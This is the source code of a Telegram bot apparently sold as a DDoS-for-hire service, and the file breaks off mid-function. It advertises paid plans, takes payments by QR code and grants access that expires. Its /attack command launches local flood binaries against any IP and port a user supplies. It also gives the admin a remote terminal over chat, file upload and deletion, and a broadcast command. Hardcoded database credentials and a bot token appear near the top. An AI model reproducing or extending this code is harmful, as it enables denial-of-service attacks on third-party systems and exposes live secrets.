import os
import socket
import subprocess
import asyncio
import pytz
import platform
import random
import string
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext, filters, MessageHandler
from pymongo import MongoClient
from datetime import datetime, timedelta, timezone

# Database Configuration
MONGO_URI = 'mongodb+srv://nedop17612:ZnXnERM6swVt16gc@cluster0.hhq4k.mongodb.net/TEST?retryWrites=true&w=majority&appName=Cluster0'
client = MongoClient(MONGO_URI)
db = client['TEST']
users_collection = db['users']
settings_collection = db['settings']
redeem_codes_collection = db['redeem_codes']
attack_logs_collection = db['user_attack_logs']

# Bot Configuration
TELEGRAM_BOT_TOKEN = '8012442954:AAFRHCWaF2TZ5c8ilUXnuLQ-idzH5R5Hip4'
ADMIN_USER_ID = 1929943036
COOLDOWN_PERIOD = timedelta(minutes=1)
user_last_attack_time = {}
user_attack_history = {}
cooldown_dict = {}
active_processes = {}
current_directory = os.getcwd()
public_mod_status = {"enabled": False, "expiry_time": None}

# Default values (in case not set by the admin)
DEFAULT_BYTE_SIZE = 5
DEFAULT_THREADS = 5
DEFAULT_MAX_ATTACK_TIME = 100
valid_ip_prefixes = ('52.', '20.', '14.', '4.', '13.')

# Adjust this to your local timezone
LOCAL_TIMEZONE = pytz.timezone("Asia/Kolkata")
PROTECTED_FILES = ["LEGEND.py", "LEGEND"]
BLOCKED_COMMANDS = ['nano', 'vim', 'shutdown', 'reboot', 'rm', 'mv', 'dd']

# Fetch the current user and hostname dynamically
USER_NAME = os.getlogin()
HOST_NAME = socket.gethostname()

# Store the current directory path
current_directory = os.path.expanduser("~")

# Function to get dynamic user and hostname info
def get_user_and_host():
    try:
        user = os.getlogin()
        host = socket.gethostname()
        if 'CODESPACE_NAME' in os.environ:
            user = os.environ['CODESPACE_NAME']
            host = 'github.codespaces'
        if platform.system() == 'Linux' and 'CLOUD_PLATFORM' in os.environ:
            user = os.environ.get('USER', 'clouduser')
            host = os.environ.get('CLOUD_HOSTNAME', socket.gethostname())
        return user, host
    except Exception:
        return 'user', 'hostname'

# Function to handle terminal commands
async def execute_terminal(update: Update, context: CallbackContext):
    global current_directory
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*❌ You are not authorized to execute terminal commands!*",
            parse_mode='Markdown'
        )
        return
    if not context.args:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*⚠️ Usage: /terminal <command>*",
            parse_mode='Markdown'
        )
        return
    command = ' '.join(context.args)
    if any(command.startswith(blocked_cmd) for blocked_cmd in BLOCKED_COMMANDS):
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"*❌ Command '{command}' is not allowed!*",
            parse_mode='Markdown'
        )
        return
    if command.startswith('cd '):
        new_directory = command[3:].strip()
        absolute_path = os.path.abspath(os.path.join(current_directory, new_directory))
        if os.path.isdir(absolute_path):
            current_directory = absolute_path
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"*📂 Changed directory to:* `{current_directory}`",
                parse_mode='Markdown'
            )
        else:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"*❌ Directory not found:* `{new_directory}`",
                parse_mode='Markdown'
            )
        return
    try:
        user, host = get_user_and_host()
        current_dir = os.path.basename(current_directory) if current_directory != '/' else ''
        prompt = f"{user}@{host}:{current_dir}$ "
        result = await asyncio.create_subprocess_shell(
            command,
            cwd=current_directory,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await result.communicate()
        output = stdout.decode().strip() or stderr.decode().strip()
        if not output:
            output = "No output or error from the command."
        if len(output) > 4000:
            output = output[:4000] + "\n⚠️ Output truncated due to length."
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"*💻 Command Output:*\n{prompt}\n```{output}```",
            parse_mode='Markdown'
        )
    except Exception as e:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"*❌ Error executing command:*\n```{str(e)}```",
            parse_mode='Markdown'
        )

async def upload(update: Update, context: CallbackContext):
    user_id = update.Effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*❌ You are not authorized to upload files!*",
            parse_mode='Markdown'
        )
        return
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*⚠️ Please reply to a file message with /upload to process it.*",
            parse_mode='Markdown'
        )
        return
    document = update.message.reply_to_message.document
    file_name = document.file_name
    file_path = os.path.join(os.getcwd(), file_name)
    file = await context.bot.get_file(document.file_id)
    await file.download_to_drive(file_path)
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=f"*✅ File '{file_name}' has been uploaded successfully!*",
        parse_mode='Markdown'
    )

async def list_files(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*❌ You are not authorized to list files!*",
            parse_mode='Markdown'
        )
        return
    directory = context.args[0] if context.args else os.getcwd()
    if not os.path.isdir(directory):
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"*❌ Directory not found:* `{directory}`",
            parse_mode='Markdown'
        )
        return
    try:
        files = os.listdir(directory)
        if files:
            files_list = "\n".join(files)
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"*📂 Files in Directory:* `{directory}`\n{files_list}",
                parse_mode='Markdown'
            )
        else:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"*📂 No files in the directory:* `{directory}`",
                parse_mode='Markdown'
            )
    except Exception as e:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"*❌ Error accessing the directory:* `{str(e)}`",
            parse_mode='Markdown'
        )

async def delete_file(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*❌ You are not authorized to delete files!*",
            parse_mode='Markdown'
        )
        return
    if len(context.args) != 1:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*⚠️ Usage: /delete <file_name>*",
            parse_mode='Markdown'
        )
        return
    file_name = context.args[0]
    file_path = os.path.join(os.getcwd(), file_name)
    if file_name in PROTECTED_FILES:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"*⚠️ File '{file_name}' is protected and cannot be deleted.*",
            parse_mode='Markdown'
        )
        return
    if os.path.exists(file_path):
        os.remove(file_path)
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"*✅ File '{file_name}' has been deleted.*",
            parse_mode='Markdown'
        )
    else:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"*⚠️ File '{file_name}' not found.*",
            parse_mode='Markdown'
        )

async def help_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        help_text = (
            "*Here are the commands you can use:* \n\n"
            "*🔸 /start* - Start interacting with the bot.\n"
            "*🔸 /attack* - Trigger an attack operation.\n"
            "*🔸 /redeem* - Redeem a code.\n"
            "*🔸 /info* - View your account status.\n"
            "*🔸 /price* - View pricing plans.\n"
            "*🔸 /public_mod_status* - Check public mode status."
            "*🔸 /paynow* - Send QR code for payment.\n"
        )
    else:
        help_text = (
            "*💡 Available Commands for Admins:*\n\n"
            "*🔸 /start* - Start the bot.\n"
            "*🔸 /attack* - Start the attack.\n"
            "*🔸 /add [user_id]* - Add a user.\n"
            "*🔸 /remove [user_id]* - Remove a user.\n"
            "*🔸 /thread [number]* - Set number of threads.\n"
            "*🔸 /byte [size]* - Set the byte size.\n"
            "*🔸 /show* - Show current settings.\n"
            "*🔸 /users* - List all allowed users.\n"
            "*🔸 /gen* - Generate a redeem code.\n"
            "*🔸 /redeem* - Redeem a code.\n"
            "*🔸 /cleanup* - Clean up stored data.\n"
            "*🔸 /argument [type]* - Set the (3, 4, or 5).\n"
            "*🔸 /delete_code* - Delete a redeem code.\n"
            "*🔸 /list_codes* - List all redeem codes.\n"
            "*🔸 /set_time* - Set max attack time.\n"
            "*🔸 /log [user_id]* - View attack history.\n"
            "*🔸 /delete_log [user_id]* - Delete history.\n"
            "*🔸 /upload* - Upload a file.\n"
            "*🔸 /ls* - List files in the directory.\n"
            "*🔸 /delete [filename]* - Delete a file.\n"
            "*🔸 /terminal [command]* - Execute.\n"
            "*🔸 /public_mod [on/off] [minutes]* - Toggle public mode.\n"
            "*🔸 /public_mod_status* - Check public mode status.\n"
            "*🔸 /info* - View user account status.\n"
            "*🔸 /paynow* - Send QR code for payment.\n"
            "*🔸 /price* - View pricing plans."
        )
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=help_text,
        parse_mode='Markdown'
    )

async def start(update: Update, context: CallbackContext):
    user = update.effective_user
    chat_id = update.effective_chat.id
    user_id = user.id
    first_name = user.first_name or "User"
    is_approved = await is_user_allowed(user_id)
    if is_approved:
        status = "🟢 Approved"
        message = (
            f"⚡ *Welcome to the battlefield, {first_name}!* ⚡\n\n"
            f"👤 *User ID:* `{user_id}`\n"
            f"{status}\n\n"
            f"🔥 *Ready to attack!* Use /attack `<ip>` `<port>` `<duration>` to begin.\n"
            f"💰 *Check pricing:* /price"
        )
    else:
        status = "🔴 Not Approved"
        message = (
            f"⚡ *Welcome to the battlefield, {first_name}!* ⚡\n\n"
            f"👤 *User ID:* `{user_id}`\n"
            f"{status}\n\n"
            f"💰 *Pricing for the bot services:* /price"
        )
    await context.bot.send_message(
        chat_id=chat_id,
        text=message,
        parse_mode='Markdown'
    )

async def price(update: Update, context: CallbackContext):
    user = update.effective_user
    first_name = user.first_name or "User"
    price_list = (
        f"👋 *Hello {first_name}!* 👋\n\n"
        "📢 *DDOS BOT AVAILABLE 24/7* 📢\n\n"
        "💰 *Price List:*\n"
        "1️⃣ *1 DAY*: 120₹ 💵\n"
        "2️⃣ *2 DAYS*: 185₹ 💵\n"
        "3️⃣ *3 DAYS*: 250₹ 💵\n"
        "4️⃣ *4 DAYS*: 275₹ 💵\n"
        "5️⃣ *5 DAYS*: 375₹ 💵\n"
        "6️⃣ *6 DAYS*: 410₹ 💵\n"
        "7️⃣ *7 DAYS*: 450₹ 💵\n\n"
        "💎 *Price dekho ge to meri baat yaad karoge, Quality dekho ge to buy karoge!* ✅\n\n"
        "📱 *IOS + ANDROID DDOS AVAILABLE* ➡️\n"
        "🔒 *PRIVATE BOT HOSTING AVAILABLE* 💘\n\n"
        "📩 *DM FOR BUY*: @LEGENDXOPL"
    )
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=price_list,
        parse_mode='Markdown'
    )

# pay now function 
# Function to handle /paynow command
async def paynow(update: Update, context: CallbackContext):
    user = update.effective_user
    chat_id = update.effective_chat.id
    username = f"@{user.username}" if user.username else "No Username"
    user_id = user.id

    # Path to the QR code image (adjust the path as needed)
    qr_code_path = os.path.join(os.getcwd(), "qr_code.jpg")  # Ensure the file is in the bot's directory

    # Check if the QR code file exists
    if not os.path.exists(qr_code_path):
        await context.bot.send_message(
            chat_id=chat_id,
            text="*❌ Error: QR code image not found. Please contact @LEGENDBHAI012 for assistance.*",
            parse_mode='Markdown'
        )
        return

    # Instructions for the user
    payment_instructions = (
        f"💳 *Payment Instructions for {username} (ID: {user_id})*\n\n"
        "1. Scan the QR code below to make the payment.\n"
        "2. After completing the payment, take a screenshot of the payment confirmation.\n"
        "3. Send the screenshot to @LEGENDBHAI012 via DM for verification.\n"
        "4. Once verified, you will be granted access to use the bot.\n\n"
        "📩 *Contact @LEGENDBHAI012 for any issues.*\n"
        "💰 *View pricing plans with /price.*"
    )

    try:
        # Send the QR code image
        with open(qr_code_path, 'rb') as qr_file:
            await context.bot.send_photo(
                chat_id=chat_id,
                photo=qr_file,
                caption=payment_instructions,
                parse_mode='Markdown'
            )

        # Notify the admin about the user's payment attempt
        await context.bot.send_message(
            chat_id=ADMIN_USER_ID,
            text=f"🔔 *New Payment Attempt*\nUser: {username}\nUser ID: {user_id}\nAwaiting payment screenshot.",
            parse_mode='Markdown'
        )

    except Exception as e:
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"*❌ Error sending QR code: {str(e)}*\nPlease contact @LEGENDBHAI012 for assistance.",
            parse_mode='Markdown'
        )
        
# broadcast message 
async def broadcast(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    # Check if the user is admin
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*❌ You are not authorized to use this command!*",
            parse_mode='Markdown'
        )
        return
    
    # Check if there's a message or a reply
    if not context.args and not update.message.reply_to_message:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*⚠️ Usage: /broadcast <message> or reply to a message/file with /broadcast*",
            parse_mode='Markdown'
        )
        return
    
    # Get all users from the database (active or expired)
    users = users_collection.find()
    user_ids = [user['user_id'] for user in users]
    
    if not user_ids:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*⚠️ No users found in the database!*",
            parse_mode='Markdown'
        )
        return
    
    # Counter for successful and failed deliveries
    success_count = 0
    failed_count = 0
    
    # If replying to a message (could be text, photo, document, etc.)
    if update.message.reply_to_message:
        reply_message = update.message.reply_to_message
        
        for target_user_id in user_ids:
            try:
                # Forward the replied message (handles text, photos, documents, etc.)
                await reply_message.forward(chat_id=target_user_id)
                success_count += 1
                await asyncio.sleep(0.05)  # Avoid rate limits
            except Exception as e:
                print(f"Failed to send to {target_user_id}: {e}")
                failed_count += 1
    
    # If broadcasting a text message
    else:
        message = ' '.join(context.args)
        
        for target_user_id in user_ids:
            try:
                await context.bot.send_message(
                    chat_id=target_user_id,
                    text=message,
                    parse_mode='Markdown'
                )
                success_count += 1
                await asyncio.sleep(0.05)  # Avoid rate limits
            except Exception as e:
                print(f"Failed to send to {target_user_id}: {e}")
                failed_count += 1
    
    # Send confirmation to admin
    await context.bot.send_message(
        chat_id=chat_id,
        text=(
            f"*📢 Broadcast Summary:*\n"
            f"✅ *Sent to:* {success_count} users\n"
            f"❌ *Failed for:* {failed_count} users"
        ),
        parse_mode='Markdown'
    )
    
    # Log the broadcast
    broadcast_log = {
        "admin_id": user_id,
        "message": message if context.args else "Forwarded content",
        "timestamp": datetime.now(timezone.utc),
        "success_count": success_count,
        "failed_count": failed_count
    }
    attack_logs_collection.insert_one(broadcast_log)

async def info(update: Update, context: CallbackContext):
    user = update.effective_user
    user_id = user.id
    username = f"@{user.username}" if user.username else "No Username"
    current_time = datetime.now(timezone.utc)
    user_data = users_collection.find_one({"user_id": user_id})
    if user_data and user_data.get('expiry_date'):
        expiry_date = user_data['expiry_date']
        if expiry_date.tzinfo is None:
            expiry_date = expiry_date.replace(tzinfo=timezone.utc)
        expiry_str = expiry_date.strftime('%Y-%m-%d %H:%M')
        time_left = expiry_date - current_time
        if time_left.total_seconds() <= 0:
            status = "🔴 Expired"
            days, hours, minutes = 0, 0, 0
        else:
            status = "🟢 Active"
            days = time_left.days
            hours = time_left.seconds // 3600
            minutes = (time_left.seconds % 3600) // 60
        time_left_str = f"{days}d {hours}h {minutes}m"
    else:
        info_message = (
            f"👤 *Username*: {username}\n"
            f"🆔 *User ID*: {user_id}\n"
            f"🔐 *Status*: 🔴 No Plan\n"
            f"📩 *Please buy a plan to use the bot!*\n"
            f"💰 Use /price to check plans and DM @LEGENDXOPL to buy."
        )
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=info_message,
            parse_mode='Markdown'
        )
        return
    info_message = (
        f"👤 *Username*: {username}\n"
        f"🆔 *User ID*: {user_id}\n"
        f"🔐 *Status*: {status}\n"
        f"📅 *Expires At*: {expiry_str}\n"
        f"⏳ *Time Left*: {time_left_str}"
    )
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=info_message,
        parse_mode='Markdown'
    )

async def add_user(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*❌ You are not authorized to add users!*",
            parse_mode='Markdown'
        )
        return
    if len(context.args) != 2:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*⚠️ Usage: /add <user_id> <days/minutes>*",
            parse_mode='Markdown'
        )
        return
    target_user_id = int(context.args[0])
    time_input = context.args[1]
    if time_input[-1].lower() == 'd':
        time_value = int(time_input[:-1])
        total_seconds = time_value * 86400
    elif time_input[-1].lower() == 'm':
        time_value = int(time_input[:-1])
        total_seconds = time_value * 60
    else:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*⚠️ Please specify time in days (d) or minutes (m).*",
            parse_mode='Markdown'
        )
        return
    expiry_date = datetime.now(timezone.utc) + timedelta(seconds=total_seconds)
    users_collection.update_one(
        {"user_id": target_user_id},
        {"$set": {"expiry_date": expiry_date}},
        upsert=True
    )
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=f"*✅ User {target_user_id} added with expiry in {time_value} {time_input[-1]}.*",
        parse_mode='Markdown'
    )

async def remove_user(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*❌ You are not authorized to remove users!*",
            parse_mode='Markdown'
        )
        return
    if len(context.args) != 1:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*⚠️ Usage: /remove <user_id>*",
            parse_mode='Markdown'
        )
        return
    target_user_id = int(context.args[0])
    users_collection.delete_one({"user_id": target_user_id})
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=f"*✅ User {target_user_id} removed.*",
        parse_mode='Markdown'
    )

async def set_thread(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*❌ You are not authorized to set the number of threads!*",
            parse_mode='Markdown'
        )
        return
    if len(context.args) != 1:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*⚠️ Usage: /thread <number of threads>*",
            parse_mode='Markdown'
        )
        return
    try:
        threads = int(context.args[0])
        if threads <= 0:
            raise ValueError("Number of threads must be positive.")
        settings_collection.update_one(
            {"setting": "threads"},
            {"$set": {"value": threads}},
            upsert=True
        )
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"*✅ Number of threads set to {threads}.*",
            parse_mode='Markdown'
        )
    except ValueError as e:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"*⚠️ Error: {e}*",
            parse_mode='Markdown'
        )

async def set_byte(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*❌ You are not authorized to set the byte size!*",
            parse_mode='Markdown'
        )
        return
    if len(context.args) != 1:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*⚠️ Usage: /byte <byte size>*",
            parse_mode='Markdown'
        )
        return
    try:
        byte_size = int(context.args[0])
        if byte_size <= 0:
            raise ValueError("Byte size must be positive.")
        settings_collection.update_one(
            {"setting": "byte_size"},
            {"$set": {"value": byte_size}},
            upsert=True
        )
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"*✅ Byte size set to {byte_size}.*",
            parse_mode='Markdown'
        )
    except ValueError as e:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"*⚠️ Error: {e}*",
            parse_mode='Markdown'
        )

async def show_settings(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*❌ You are not authorized to view settings!*",
            parse_mode='Markdown'
        )
        return
    byte_size_setting = settings_collection.find_one({"setting": "byte_size"})
    threads_setting = settings_collection.find_one({"setting": "threads"})
    argument_type_setting = settings_collection.find_one({"setting": "argument_type"})
    max_attack_time_setting = settings_collection.find_one({"setting": "max_attack_time"})
    byte_size = byte_size_setting["value"] if byte_size_setting else DEFAULT_BYTE_SIZE
    threads = threads_setting["value"] if threads_setting else DEFAULT_THREADS
    argument_type = argument_type_setting["value"] if argument_type_setting else 3
    max_attack_time = max_attack_time_setting["value"] if max_attack_time_setting else 60
    settings_text = (
        f"*Current Bot Settings:*\n"
        f"🗃️ *Byte Size:* {byte_size}\n"
        f"🔢 *Threads:* {threads}\n"
        f"🔧 *Argument Type:* {argument_type}\n"
        f"⏲️ *Max Attack Time:* {max_attack_time} seconds\n"
    )
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=settings_text,
        parse_mode='Markdown'
    )

async def list_users(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*❌ You are not authorized to list users!*",
            parse_mode='Markdown'
        )
        return
    current_time = datetime.now(timezone.utc)
    users = users_collection.find()
    user_list_message = "👥 *User List:*\n"
    for user in users:
        user_id = user['user_id']
        expiry_date = user['expiry_date']
        if expiry_date.tzinfo is None:
            expiry_date = expiry_date.replace(tzinfo=timezone.utc)
        time_remaining = expiry_date - current_time
        if time_remaining.days < 0:
            remaining_days = 0
            remaining_hours = 0
            remaining_minutes = 0
            expired = True
        else:
            remaining_days = time_remaining.days
            remaining_hours = time_remaining.seconds // 3600
            remaining_minutes = (time_remaining.seconds // 60) % 60
            expired = False
        expiry_label = f"{remaining_days}D-{remaining_hours}H-{remaining_minutes}M"
        if expired:
            user_list_message += f"🔴 *User ID: {user_id} - Expiry: {expiry_label}*\n"
        else:
            user_list_message += f"🟢 *User ID: {user_id} - Expiry: {expiry_label}*\n"
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=user_list_message,
        parse_mode='Markdown'
    )

async def is_user_allowed(user_id):
    user = users_collection.find_one({"user_id": user_id})
    if user:
        expiry_date = user['expiry_date']
        if expiry_date:
            if expiry_date.tzinfo is None:
                expiry_date = expiry_date.replace(tzinfo=timezone.utc)
            if expiry_date > datetime.now(timezone.utc):
                return True
    return False

async def set_argument(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*❌ You are not authorized to set the argument!*",
            parse_mode='Markdown'
        )
        return
    if len(context.args) != 1:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*⚠️ Usage: /argument <3|4|5>*",
            parse_mode='Markdown'
        )
        return
    try:
        argument_type = int(context.args[0])
        if argument_type not in [3, 4, 5]:
            raise ValueError("Argument must be 3, 4, or 5.")
        settings_collection.update_one(
            {"setting": "argument_type"},
            {"$set": {"value": argument_type}},
            upsert=True
        )
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"*✅ Argument type set to {argument_type}.*",
            parse_mode='Markdown'
        )
    except ValueError as e:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"*⚠️ Error: {e}*",
            parse_mode='Markdown'
        )

async def set_max_attack_time(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*❌ You are not authorized to set the max attack time!*",
            parse_mode='Markdown'
        )
        return
    if len(context.args) != 1:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*⚠️ Usage: /set_time <max time in seconds>*",
            parse_mode='Markdown'
        )
        return
    try:
        max_time = int(context.args[0])
        if max_time <= 0:
            raise ValueError("Max time must be a positive integer.")
        settings_collection.update_one(
            {"setting": "max_attack_time"},
            {"$set": {"value": max_time}},
            upsert=True
        )
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"*✅ Maximum attack time set to {max_time} seconds.*",
            parse_mode='Markdown'
        )
    except ValueError as e:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"*⚠️ Error: {e}*",
            parse_mode='Markdown'
        )

async def log_attack(user_id, ip, port, duration):
    attack_log = {
        "user_id": user_id,
        "ip": ip,
        "port": port,
        "duration": duration,
        "timestamp": datetime.now(timezone.utc)
    }
    attack_logs_collection.insert_one(attack_log)

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    current_time = datetime.now(timezone.utc)
    global public_mod_status
    public_mod_data = settings_collection.find_one({"setting": "public_mod"})
    if public_mod_data:
        public_mod_status["enabled"] = public_mod_data.get("enabled", False)
        public_mod_status["expiry_time"] = public_mod_data.get("expiry_time")
    if public_mod_status["enabled"] and public_mod_status["expiry_time"]:
        if public_mod_status["expiry_time"].tzinfo is None:
            public_mod_status["expiry_time"] = public_mod_status["expiry_time"].replace(tzinfo=timezone.utc)
        if public_mod_status["expiry_time"] <= current_time:
            public_mod_status["enabled"] = False
            public_mod_status["expiry_time"] = None
            settings_collection.update_one(
                {"setting": "public_mod"},
                {"$set": {"enabled": False, "expiry_time": None}},
                upsert=True
            )
    if not (await is_user_allowed(user_id) or public_mod_status["enabled"]):
        await context.bot.send_message(
            chat_id=chat_id,
            text="*❌ You are not authorized to use this bot!*",
            parse_mode='Markdown'
        )
        return
    last_attack_time = cooldown_dict.get(user_id)
    if last_attack_time:
        elapsed_time = current_time - last_attack_time
        if elapsed_time < COOLDOWN_PERIOD:
            remaining_time = COOLDOWN_PERIOD - elapsed_time
            await context.bot.send_message(
                chat_id=chat_id,
                text=f"*⏳ Please wait {remaining_time.seconds // 60} minute(s) and {remaining_time.seconds % 60} second(s) before using /attack again.*",
                parse_mode='Markdown'
            )
            return
    args = context.args
    if len(args) != 3:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*⚠️ Usage: /attack <ip> <port> <duration>*",
            parse_mode='Markdown'
        )
        return
    ip, port, duration = args
    if not ip.startswith(valid_ip_prefixes):
        await context.bot.send_message(
            chat_id=chat_id,
            text="*⚠️ Invalid IP prefix. Only specific IP ranges are allowed.*",
            parse_mode='Markdown'
        )
        return
    if user_id in user_attack_history and (ip, port) in user_attack_history[user_id]:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*❌ You have already attacked this IP and port*",
            parse_mode='Markdown'
        )
        return
    try:
        duration = int(duration)
        max_attack_time_setting = settings_collection.find_one({"setting": "max_attack_time"})
        max_attack_time = max_attack_time_setting["value"] if max_attack_time_setting else DEFAULT_MAX_ATTACK_TIME
        if duration > max_attack_time:
            await context.bot.send_message(
                chat_id=chat_id,
                text=f"*⚠️ Maximum attack duration is {max_attack_time} seconds. Please reduce the duration.*",
                parse_mode='Markdown'
            )
            return
    except ValueError:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*⚠️ Duration must be an integer representing seconds.*",
            parse_mode='Markdown'
        )
        return
    argument_type = settings_collection.find_one({"setting": "argument_type"})
    argument_type = argument_type["value"] if argument_type else 3
    byte_size = settings_collection.find_one({"setting": "byte_size"})
    threads = settings_collection.find_one({"setting": "threads"})
    byte_size = byte_size["value"] if byte_size else DEFAULT_BYTE_SIZE
    threads = threads["value"] if threads else DEFAULT_THREADS
    if argument_type == 3:
        attack_command = f"./LEGEND3 {ip} {port} {duration}"
    elif argument_type == 4:
        attack_command = f"./LEGEND4 {ip} {port} {duration} {threads}"
    elif argument_type == 5:
        attack_command = f"./LEGEND {ip} {port} {duration} {byte_size} {threads}"
    await context.bot.send_message(
        chat_id=chat_id,
        text=(
            f"*⚔️ Attack Launched! ⚔️*\n"
            f"*🎯 Target: {ip}:{port}*\n"
            f"*🕒 Duration: {duration} seconds*\n"
            f"*🔥 Let the battlefield ignite! 💥*"
        ),
        parse_mode='Markdown'
    )
    await log_attack(user_id, ip, port, duration)
    asyncio.create_task(run_attack(chat_id, attack_command, context))
    cooldown_dict[user_id] = current_time
    if user_id not in user_attack_history:
        user_attack_history[user_id] = set()
    user_attack_history[user_id].add((ip, port))

async def view_attack_log(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*❌ You are not authorized to view attack logs!*",
            parse_mode='Markdown'
        )
        return
    if len(context.args) < 1:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*⚠️ Usage: /log <user_id>*",
            parse_mode='Markdown'
        )
        return
    target_user_id = int(context.args[0])
    attack_logs = attack_logs_collection.find({"user_id": target_user_id})
    if attack_logs_collection.count_documents({"user_id": target_user_id}) == 0:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*⚠️ No attack history found for this user.*",
            parse_mode='Markdown'
        )
        return
    logs_text = "*User Attack History:*\n"
    for log in attack_logs:
        local_timestamp = log['timestamp'].replace(tzinfo=timezone.utc).astimezone(LOCAL_TIMEZONE)
        formatted_time = local_timestamp.strftime('%Y-%m-%d %I:%M %p')
        logs_text += (
            f"IP: {log['ip']}\n"
            f"Port: {log['port']}\n"
            f"Duration: {log['duration']} sec\n"
            f"Time: {formatted_time}\n\n"
        )
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=logs_text,
        parse_mode='Markdown'
    )

async def delete_attack_log(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*❌ You are not authorized to delete attack logs!*",
            parse_mode='Markdown'
        )
        return
    if len(context.args) < 1:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*⚠️ Usage: /delete_log <user_id>*",
            parse_mode='Markdown'
        )
        return
    target_user_id = int(context.args[0])
    result = attack_logs_collection.delete_many({"user_id": target_user_id})
    if result.deleted_count > 0:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"*✅ Deleted {result.deleted_count} attack log(s) for user {target_user_id}.*",
